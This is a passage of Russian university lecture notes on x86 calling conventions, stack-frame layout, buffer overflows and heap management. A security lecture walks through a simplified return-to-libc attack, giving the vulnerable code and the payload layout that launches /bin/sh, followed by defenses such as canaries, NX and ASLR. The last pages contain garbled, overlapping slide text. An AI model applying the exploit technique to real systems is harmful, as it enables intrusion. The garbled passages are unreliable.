значительно количество. Поэтому принимают следующие соглашения:

   • Первый и второй параметры размещаются в регистрах ECX и EDX (Если размер
     параметров позволяет).

   • Остальные параметры на стеке, от них стек очищает вызванная функция, как и в
     stdcall.

   • Такая форма соглашения принята в gcc и MSVC.

Рассмотрим случай, когда код был собран с указанием атрибута fastcall:
typedef               struct chain chain

struct chain {
        unsigned data ;
        chain * next ;
};

__attribute__ (( fastcall )) unsigned xorEmAll ( chain *p, unsigned salt )
{
        if (p) {
                  return p--> data ^= xorEmAll (p -->next , salt );
        } else {


                                           144
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  return salt ;
                   }
}
   Здесь мы проходим по однонаправленном списку и каждый элемент полезной
нагрузки подвергается xor со вторым параметром. Параметр р – указатель, поэтому
он умещается в ecx, второй параметр помещается в edx, поэтому стек не используется
для передачи параметров. Таким образом, если собрать функцию с включённой
оптимизацией, мы получим:
xorEmAll :
         test                     ecx , ecx
         mov                      eax , edx
         je                       .L6
         push                     ebx
         mov                      ebx , ecx
         sub                      esp , 8
         mov                      ecx , dword [ ecx +4]
         call                     xorEmAll
         xor                      eax , dword [ ebx ]
         mov                      dword [ ebx ], eax
         add                      esp , 8
         pop                      ebx
.L6:
         ret
   Фактически пролог отсутствует, сразу переходим к работе с параметром р. В первой
строке проверяем, что параметр р ненулевой. Если он нулевой, переходим к метке .L6.
Та часть кода, которая находится ниже строки перехода к метке, описывает действия,
происходящие внутри ветки true оператора if.


Особенности 64-разрядной процессорной архитектуры
    Особенности полноценной 64-разрядной процессорной архитектуры:

    • АЛУ оперирует 64 х разрядными данными

    • (Большой) набор 64 х разрядных регистров общего назначения

    • 64 х разрядное (плоское) адресное пространство

Отсюда получаем преимущества 64-разрядной процессорной архитектуры:

    • Эффективнее (быстрее) работаем с 64 х разрядными данными


                                                  145
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Реже «проливаем» содержимое регистров

   • Огромное пространство адресуемой памяти: 264 = 16 × 230 × 230 = 16 Эксбибайт

Примеры полноценной 64-разрядных архитектур: PowerPC, Sparc , Alpha, IA 64 (Itanium).


Архитектура х86_64
   В момент появления х86_64 едва ли можно было отнести к полноценным 64 x
разрядным архитектурам, так как

   • Архитектура x86_64 была получена очередным эволюционным расширением ISA
     IA 32

   • Двоичная кодировка команд IA 32 не изменилась. Работа с 64 х разрядными
     регистрами и данными реализована через специальные префиксы в коде операции,
     переопределяющие поведение процессора по умолчанию. Декодирование команд
     «оптимизировано» для работы с 32 х разрядными командами.

   • Доступ к 64 х разрядному адресному пространству реализован через доработанный
     механизм сегментной памяти IA 32

AMD/Intel пошли таким путем, потому что

   • Некоторые свойства 64 х разрядных процессоров достигаются, причем переход с 32
     х разрядных процессоров получается проще

   • Сохранена работоспособность ISA IA 32 , а следовательно всех раннее написанных
     для данной архитектуры программ.

В данном случае нет честной адресации всех 16 Эксбибайт не существует. Аппаратура
поддерживает чуть меньшее количество разрядов, с которыми позволяет работать. При
этом регистров стало больше (16 вместо 8) и размер каждого регистра расширился до
64 разрядов. Привычные названия регистров сохранились, остальные восемь назвали
по номерам. Регистр EIP превратился в регистр RIP, EFLAGS – в RFLAGS, тоже
расширенный до 64 разрядов. Также была добавлена особенность – обращение к данным
через смещение относительно счётчика команд. Однако возникает ограничение: в данной
архитектуре мы почти никогда не можем задавать произвольные 64-разрядные константы.
Такую величину можно закодировать только в команде MOV:

   • Переслать непосредственно закодированный операнд можно только в регистр.

   • В общем формате адресного кода операнда памяти смещение осталось 232 . Можно
     задать абсолютный адрес 264 , но только если это пересылка данных из RAX.



                                        146
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Следующие изменения произошли в соглашении вызова функции. В основное
соглашение вызова было создано в некоторой степени аналогично рассмотренному
выше. Идеалогически оно было похоже на совмещение отказа от указателя фрейма и
соглашения FASTCALL. При этом аргументы передаются не через пару регистров (ecx и
edx или rcx и rdx), а через большее число регистров (рис. 12.1).




                                  Рис. 12.1: Иллюстрация к объяснению

   Таким образом, особенности регистров x86-64:

   • Аргументы передаются в функцию через регистры

            – Если целочисленных параметров более 6, остальные передаются через стек
            – Регистры аргументы могут рассматриваться как сохраненные на стороне
              вызывающей функции

   • Все обращения к фрейму организованы через указатель стека (Отпадает
     необходимость поддерживать значения EBP/RBP)

   • Остальные регистры:

            – 6 регистров сохраняется вызванной функцией
            – 2 регистра сохраняется вызывающей функцией
            – 1 регистр для возвращаемого значения может рассматриваться как регистр,
              сохраненный на стороне вызывающей функции
            – 1 выделенный регистр указатель стека




                                                 147
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 13. Безопасность программного обеспечения
    В данной лекции рассмотрим как связан такой аспект как безопасность программного
обеспечения с тем, что происходит на уровне языка ассемблера. Сначала рассмотрим три
примера, на которых будут рассмотрены проявления ошибочных ситуаций, а в конце будет
“разоблачение”.


Пример 1 “Заглянуть за горизонт”
     Рассматривается фрагмент кода, печатающего элементы массива.
void f(int i) {
        int a [3] = {1 , 2, 3};
        printf ("%x\n", a[i ]);
}
Казалось бы, что ошибок в данной функции нет. Однако, контекст вызова данной функции
может быть произвольным, таким образом функция может вызваться с любым значением
аргумента. То есть, не только в интервале от 0 до 2, а и больше и меньше. Выйдя за
границы, можно наткнуться на неопределённое поведение (Undefined behaviour). С точки
зрения стандарта языка может происходить что угодно, а с точки зрения машины это будет
вполне конкретная последовательность действий, которая будет выполняться согласно
предписанию.
    Если исполнить программу, в которой вызывается данная функция со значением
параметра, например от 0 до 9. Тогда на выходе программа будет сначала печатать числа
1, 2, 3, а затем какие-то шестнадцатеричные числа. Казалось бы, что это случайные
“мусорные” значения, но это не совсем так. Для этого необходимо рассмотреть
сгенерированный ассемблерный код и нарисовать устройство фрейма.
    Ассемблерный код для функции f выглядит так:
f:
                    push           ebp
                    mov            ebp , esp
                    sub            esp , 32
                    mov            eax , dword [ebp +8]
                    mov            dword [ebp -20] , 1
                    mov            dword [ebp -16] , 2
                    mov            dword [ebp -12] , 3
                    push           dword [ebp -20+ eax *4]
                    push           .LC1
                    call           printf
                    add            esp , 16


                                                   148
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                   leave
                   ret
    Фрейм вышеописанной функции представлен на картинке 13.1. В верхней части
горизонтальной чертой отмечена граница выровненных адресов, над ней располагается
параметр 𝑖, который являлся аргументом в момент вызова. Ниже находится адрес
возврата, ниже находится 𝑒𝑏 𝑝, так как отрабатывается стандартный пролог. Новое
значение переставляется. Затем видно, что из 𝑒𝑠𝑝 вычитается 32, значит появляется ещё
8 элементов на стеке. Пространство стека разделим отсечками для удобства. Получилось
два блока. Затем следует вызов функции 𝑝𝑟𝑖𝑛𝑡 𝑓 (), она библиотечная и её нужно вызывать
на выровненной границе. После её вызова добавляются два нижних элемента на стек.
Нижний третий блок является пространством аргументов. В самом низу лежит ссылка
на константу со строкой с форматирования (.𝐿𝐶1). Над ней располагается ещё одна
ссылка, которая идёт на определённый адрес до смещения -20 - отмечено на рисунке 13.1.
Выделим массив 𝑎. Тогда видно, куда показывается вторая ссылка, она идёт по адресу
(𝑒𝑏 𝑝 − 20 + 𝑒𝑎𝑥 · 4) и отмечена синей стрелкой.

                                                       i
                                                адрес возврата
                                   ebp              ebp'
                                       -4
                                      -8
                                     -12               3
                            .LC1     -16               2                           a
                                     -20               1


                        пространство
                         аргументов




                Рис. 13.1: Фрейм функции f при вызове с различными параметрами.

   Таким образом, после того, как будут выведены три элемента, два значения будут
напечатаны и будут являться “мусором” действительно, потому что они находятся в не
инициализированной области стека (выше тройки две ячейки). Понятно, что тогда шестое
выведенное значение будет являться 𝑒𝑏 𝑝. Аналогично седьмое - адрес возврата, а потом


                                             149
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




текущий аргумент. Затем стало печататься то, что находится во фрейме предыдущей
функции.
   Итого, при выходе за границ буфера программа продолжает работу, если память
доступна для чтения. В этом случае нельзя рассчитывать на аварийное завершение.


Пример 2. “Нескучная арифметика”
    Рассмотрим пример, в котором вызывается некоторая функция f из main, которая что-
то записывает. Код фрагмента программы:
void f() {
        char buf [5];
        int * ptr ;

                   ptr = (int *)( buf + 1);
                   (* ptr ) += 2021
}

void main () {
        int x = 1;

                   f ();
                   x += 1;
                   printf ("1 + 1 = %d\n", x);
}
    Выполняя программу первый раз, она выведет ожидаемый результат 2. Кажется, что
функция f() находится в отдельной области и другого быть не может. Однако, внутри
неё происходит неопределённое поведение. Можно найти два способа, при которых
при сложении 1 + 1 получится 2. В этом примере придётся нарисовать два фрейма,
относящихся к текущей функции f и к тому, что находится за её границей.
    На рисунке 13.2 представлен фрейм функции f. Заштрихован массив buf. В
предыдущем примере мы читали за границей фрейма. Переменная X живёт за
границей фрейма функции f, внутри фрейма, относящегося к функции main. Смотря на
ассемблерный код данной программы (который здесь не приводится из-за чрезмерного
объёма), можно увидеть где будет на фрейме находиться переменная X. Расстояние от
buf до X можно рассчитать, оно равно 29 байтам.
    Таким образом, если в X будет помещена “-1”, то на выходе получится “нескучная
арифметика”, а именно 1+1 будет равняться 1.
    Отметим, что в рассмотренных примерах при перемещении по фрейму можно было
записать другое значение в адрес возврата. Например, в данном примере это является



                                              150
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU



                                                                         29 байт до X
                        порядок байт
                                   0           1         2        3
                                              адрес возврата
                            ebp                   ebp'
                                    -4
                                   -8                                     buf
                                  -12




                                         Рис. 13.2: Фрейм функции f.


вторым способом получить равенство 1 + 1 = 1 как результат работы программы. Таким
образом, мы повлияли на ход выполнения самой программы.


Пример 3. “return-to-libc”
   В данном примере присутствуют две функции: main и f. Программа открывает
некоторый файл, считывает оттуда данные, и эти данные затем печатает обратно на
стандартный вывод. В конце программа спит одну секунду и завершает свою работу.
   Код программы (фрагмент):
void f( FILE * fd) {
         char buf [16];
         fgets (buf , 256 , fd );
         puts ( buf );
}
int main (int argc , char * argv []) {
         FILE *fd = fopen ( argv [1] , "rb");
         f( fd );
         fclose (fd );
         system (" sleep 1");
         return 0;
}
   Так как в программе содержится дефект, её работу можно поменять совершенно
произвольным способом. Опасное место - функция fgets, которая никак не контролирует
сколько будет считано байт по отношению к массиву buf. Использовать данное место
можно таким образом, чтобы в итоге можно было добиться исполнения функции



                                                    151
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU



                                   main



                       ebp                               ebp'
                                    -4                   ecx
                                   -8
                                  -12                     X




                                                                          29 байт от buf
                                             Рис. 13.3: Фрейм функции main.


system с совсем другим аргументом. Эта функция может превратиться в программный
интерпретатор, если в качестве параметра ей подать /bin/sh.
    Для того, чтобы понять каким образом это сделать, необходимо разобраться с
детальным устройством программы (в каких адресах начался и закончился фрейм и
его устройство). Можно разобраться в работе программы с помощью отладчика. В
линуксе стандартный отладчик - это GDB. Однако, наблюдая за программой отладчиком,
мы действуем инструментом на объект, который меняет поведение объекта. То есть,
отладчик меняет переменное окружение.
    Ассемблерный код функции f:
0 x08048900                              <+0 >:    push ebx
0 x08048901                              <+1 >:    sub esp ,0 x1c
0 x08048904                              <+4 >:    push DWORD PTR [esp +0 x24 ]
0 x08048908                              <+8 >:    push 0 x100
0 x0804890d                              <+13 >:   lea ebx ,[ esp +0 xc]
0 x08048911                              <+17 >:   push ebx
0 x08048912                              <+18 >:   call 0 x80504f0 <fgets >
0 x08048917                              <+23 >:   mov DWORD PTR [esp],ebx
0 x0804891a                              <+26 >:   call 0 x80509a0 <puts >
0 x0804891f                              <+31 >:   add esp ,0 x28
0 x08048922                              <+34 >:   pop ebx
0 x08048923                              <+35 >:   ret
   Рассмотрим фрейм при старте программы. На самом верху будут какие-то данные,


                                                          152
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




относящиеся к операционной системе, потом идёт переменное окружение, которое
описывается ключевым словом env. Затем идут аргументы вызова и так далее. Так
как отладчик добавит дополнительные элементы в env, то граница фрейма каждой
вызываемой функции сдвинется на какую-то величину вниз, то есть картина будет
отлична от той, что можно было бы наблюдать в реальной жизни без отладчика. Такой
недостаток можно обойти, используя простой скрипт.
   На рисунке 13.4 представлен фрейм наблюдаемой функции. В самом верху находится
файловый дескриптор fd. Первый push, если посмотреть на ассемблерный код программы,
записывает fd внизу, затем идёт 256, а затем будет записан адрес буфера buf, который
занимает 16 байт.
                                                          fd
                                                    адрес возврата
                                                         ebx'



                                                                                    buf



                                                           fd
                                                          256



                                  Рис. 13.4: Фрейм наблюдаемой функции для примера 3.

    Когда начнётся запись информации, сначала полностью заполнится буфер buf, потом
начнётся заполнение выше по фрейму. Таким образом, мы можем записать и в адрес
возврата. Путём подмены адреса возврата, после завершения функции f, она прыгнет в
начало функции system.
    В тот момент, когда функция будет выполняться, она будет видеть на стеке
следующую картину (рисунок 13.5). Она будет видеть некоторые элемент, куда
показывает esp, и она будет искренне считать, что это адрес возврата той точки, откуда
её вызвали (но был сделан прыжок, и esp будет показывать на fd). Выше будет лежать
указатель, ссылающийся на строчку, лежащую выше, а над ним сама строчка. Теперь,
чтобы всё заработало, нужно определить, какую величину надо записать, где лежит
указатель на строку, чтобы этой величиной оказался адрес места памяти выше (это
делается через отладчик). Адрес будет являться аргументом функции system, который
пытались определить.



                                                         153
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                   esp                           fd

                                   Рис. 13.5: Стек при исполнении функции в примере 3.


   Построим то, что будем отправлять на вход рассматриваемой уязвимой функции для
использования уязвимости. Данные на вход будут являться строкой. Первые 28 байт
может быть любой информацией. После должен быть размещён адрес возврата, затем
снова 4 байта, которые не принципиальны. Затем должен идти выше определённый адрес.
В конце будет /bin/ sh и нулевой байт.
   Данный пример является упрощённой атакой return-to-libc. Такие специальные
подготовленные входные данный называются эксплойт.


Способы защиты
Канарейка на стеке

   Название позаимствовано из жизни шахтёров. Канарейка переставала петь при
критической концентрации взрывоопасных газов. На стеке ситуация похожа. Можно
разместить на фрейме некоторую величину, у которой будет фиксированное эталонное
значение. Если функция отработала и в конце обнаружила убитую эталонную величину
(переписанную), то это верный признак того, что в каких-то данных произошло
переполнение при обращении на запись. В таком случае переполнение переписало к тому
же ещё и адрес возврата с большой вероятностью. Из функции в таком случае выходить
ни в коем случае нельзя. В коде такая вставка выглядит следующим образом:
...                 ; ������
mov                 eax , dword [gs :20]
mov                 dword [ebp -12] , eax
xor                 eax , eax
...                 ; �����������
mov                 edx , dword [ebp -12]
xor                 edx , dword [gs :20]
je                  .L3
call                __stack_chk_fail



                                                          154
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




.L3 :
...                  ; ������
После отработки пролога используется специальная структура данных для работы
с эталонными значениями. Существуют сегментные регистры (например [𝑔𝑠 : 20]),
который можно определить так, что он будет показывать на некоторую служебную
структуру данных, описывающую нужную для организации работы программы
информацию. Называется это TLS - локальное хранилище для текущего потока
выполнения. И из этого потока по смещению 20 (так как [𝑔𝑠 : 20]) находится эталонное
значение длиной в 4 байта - канарейка. Эту канарейку отправляют внутрь фрейма,
которая находится сверху на стеке.

Другие способы

   • Можно ограничить память так, чтобы она была доступна на чтение (исполнение),
     но не на запись. Существует специальный бит, который запрещает одновременную
     запись и исполнение (NX bit).

   • Можно так размещать данные на фрейме, чтобы над массивами не оказывалось
     никаких указателей.

   • Можно перемешать адреса на стеке (Address Space Layout Randomization (ASLR))

   • Безопасные библиотеки

    Кроме того, у некоторых стандартных функций появляются безопасные версии,
которые компилятор может применять по своему усмотрению. Например, функцию
printf он может заменить на функцию 𝑝𝑟𝑖𝑛𝑡 𝑓 _𝑐ℎ𝑘, которая проводит все дополнительные
проверки для форматной строки. Такая технология, которая применяет защищённые
версии, называется 𝐹𝑂𝑅𝑇 𝐼 𝐹𝑌 _𝑆𝑂𝑈 𝑅𝐶𝐸. Механизмы безопасности могут работать
одновременно. Комплекс защиты современных систем даёт хорошую защиту. Ядро
ubuntu сейчас имеет различные технологии безопасности.




                                        155
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 14. Динамическая память
Управление динамической памятью
   Динамическая память - это некоторое пространство, которое называется кучей,
которой можно пользоваться для размещения по ходу выполнения программы каких-то
данных. Причём, эти данные не будут ограничены областью своей жизни, как это
происходит в автоматических локальных переменных. То есть, одно пространство можно
запросить и заполнить из одной функции, а потом в совершенно другом месте программы
этот блок освободить.
   Вся работа происходит посредством интерфейса менеджера работы с динамической
памятью. Ключевые функции в C, отвечающие за выделение (calloc, malloc),
перевыделение (realloc) и освобождение памяти (free). Кучей пользуются, когда заранее
неизвестен размер данных, время появление, область жизни.
void     * calloc ( size_t nmemb , size_t size );
void     * malloc ( size_t size );
void     free ( void * ptr )
void     * realloc ( void ptr , size_t size );
   Существует специальная интерфейсная функция sbrk, с помощью которой
можно попросить у операционной системы добавить определённое дополнительное
пространство, с которым хотим работать.
void * sbrk ( intptr_t increment );
    Пространство будет появляться в верхних адресах, относительно статических данных
и расти в сторону стэка - рисунок 14.1. Текущую границу кучи можно узнать через sbrk(0),
так как sbrk как раз сдвигает верхнюю границу.
    Границы стэка и кучи конечно могут сойтись, но их собственные колебания не влияют
друг на друга.


Выделение динамической памяти
   Менеджер работает не с отдельными байтами, а с блоками памяти. Менеджер
рассматривает кучу, как последовательность блоков некоторого размера. Сами блоки
состоят тоже не из байтов, а из машинных слов, так как будут определяться требования
по выравниванию. Управление блоками бывает двух типов:

  1. Явное управление: когда сам разработчик отвечает за то, в какой момент он запросит,
     а в какой память освободит. Яркий пример - язык C. Такой способ даёт выигрыш по
     производительности, но добавляет титанический объём ответственности.




                                          156
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                                                                                       © 2021 МГУ/ВМК/




Архитектура ЭВМ и язык ассемблера                       Интерфейсные функции
                                                                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                        Пользовательский стек


                                                                   Верхушка
                                                                   кучи
                                                Куча

                                       Неинициализированные
                                      статические данные (.bss)
                                         Инициализированные
                                      статические данные (.data)                                   © 2021 МГУ/ВМК/СП


                                       Код программы (.text)
           void foo(int n, int m) {
               int i, *p;                                                                                                      3
                                  0
        /* Выделяем блок из n целых чисел */
     Рис. 14.1: Устройство кучи и стека в памяти, они растут навстречу друг другу.
             p = (int *) malloc(n * sizeof(int));
             if (p == NULL) {                                   • В дальнейшем
  2. Неявное управление. Разработчик выделяет память, но освобождает
                                                                  материале её за него
                  perror("malloc");
     сборщик мусора    автоматически. Освобождаться в данном предполагается,
                  exit(0);                                                        что
                                                                   случае будут только
             } которые признаны, как недоступные для работы.
     те блоки,                                                    выделение
                                                                      Для нихи должно
                                                                  освобождение памяти
     быть доказано, что обратиться из текущего потока программы к ним уже нельзя.
             ...                                                  происходит с блоками
     Зачастую такое управление используется, когда код работает          в виртуальном
                                                                  машинных  слов
        /* Возвращаем
     окружении.   Даже впространство
                          языке C++ естьв библиотеки,
                                            кучу */             • Машинное
                                                       позволяющие    неявнослово
                                                                              управлять
             free(p);
     памятью в той или иной мере.                                 вмещает указатель, т.е.
        }                                                         4 байта




      Выделенный блок                          Свободный блок                   Свободное слово
          (4 слова)                               (3 слова)                                                5
                                                                               Занятое слово

Рис. 14.2: Пример изображения кучи. Блоки могут иметь какой-то фиксированный размер,
заполнение происходит слева направо. Если присутствует свободное пространство
размером, вмещающим блок, который запрашивается, то он выделяется. Иначе ищется
свободное пространство дальше, таким образом образуются “дыры”.

   Отметим, что malloc может вернуть NULL. Такая ситуация например может быть при
исчерпывании памяти.




                                                       157
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Ограничения
   Если создавать вышеописанные функции, следуя стандарту языка C, то необходимо
будет преодолеть определённые проблемы.

   • Пользовательская программа не накладывает никаких ограничений на себя и может
     требовать столько вызовов функций malloc и free, сколько посчитает нужным.
     Таким образом последовательность вызовов этих функций будет произвольна.

   • Вызовы free получают в качестве аргумента только указатель из функций malloc.
     Отсутствует параметр, отвечающий за размер заранее выделенной памяти.

   • Память должна предоставляться        незамедлительно,       поэтому        необходимо
     выравнивать блоки.

   • Если что-то уже было выделено, то эти данные уже не переместить для более
     рационального использования места.


Производительность. Пропускная способность
   Если взять два различных менеджера работы с динамической памятью (две разные
реализации), правомерно поставить задачу их сравнения.
   Необходимо выделить набор численных характеристик.

  1. Один из критериев - достигаемая пропускная способность. То есть, цель -
     уменьшить количество служебных действий между запросами. Итог - число
     выполненных запросов за единицу времени. То есть, например, количество
     вызовов malloc и free в секунду.

  2. Второй показатель - это пиковое использование памяти. То есть, сколько данных,
      полезных с точки зрения пользователя, менеджер смог разместить в пространстве
      куча. Рассмотрим порядок запросов вызовов функций malloc и free. Можно
      суммарно посчитать, сколько суммарно байт было запрошено функцией malloc
     - это будет суммарная полезная нагрузка. Затем суммарная полезная нагрузка
      делится на размер кучи и получается пиковое использование памяти после
      какого-то числа запросов.


Внутренняя фрагментация. Внешняя фрагментация
   Фрагментация бывает двух видов, рассмотрим оба.

  1. Внутренняя фрагментация.Данный тип фрагментации возникает из-за того, что
     помимо пользовательских данных, помимо пользовательских данных, служебные
     данные тоже нуждаются в хранении. Таким образом, полезная нагрузка будет лишь


                                       158
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                        © 2021
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ     МГУ/ВМК/СП
                                                                                            СОДЕРЖАТЬ   ОШИБКИ
Падарян Вартан Андроникович                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU



                         Внутренняя
      частью блока, который                фрагментация
                              занимается. Полезная нагрузка может быть как в начале, так
      в конце и вы середине блока. Кроме того, существуют требования выравнивания.
      Всё• это будет “отъедать”
             Внутренняя         пространство.
                         фрагментация возникает если размер полезной нагрузки
                    меньше размера блока
                                                 Блок

                 Внутренняя                                                     Внутренняя
                 фрагментация              Полезная нагрузка                    фрагментация

            • Причины возникновения
Рис. 14.3: Иллюстрация
             – Накладныевнутренней
                           расходы на фрагментации.  Полезная
                                      поддержку внутренних     нагрузка
                                                            структур данных занимает лишь
             – Выравнивание
часть блока памяти.
             – Особенности политики выделения блоков                 © 2021 МГУ/ВМК/СП
               (например, принудительно выделяется блок большего размера)
   2. Внешняя   фрагментация.
         • Зависит              Данное явлениепредыдущих
                   только от последовательности  трудно подсчитать  количественно, так
                                                           запросов памяти
      как оно– выражается
                         Внешняя
               Легко измерить
                                       фрагментация
                            только в тот момент, когда памяти уже перестаёт хватать.
